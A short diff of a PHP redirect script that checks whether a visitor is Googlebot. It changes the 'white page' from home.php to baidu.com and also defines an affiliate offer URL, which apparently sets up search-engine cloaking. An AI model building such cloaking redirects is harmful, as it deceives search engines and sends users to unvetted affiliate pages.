@@ -13,7 +13,7 @@ function redirect_to_page($url) {
 $user_agent = get_user_agent();
 $is_google_bot = is_google_bot($user_agent);
 
-$white_page = 'home.php';
+$white_page = 'https://www.baidu.com/';
 $affiliate_offer_page = 'https://roigeneratr.com/?a=9748&c=20858&s1=gg';
 
 if($is_google_bot) {
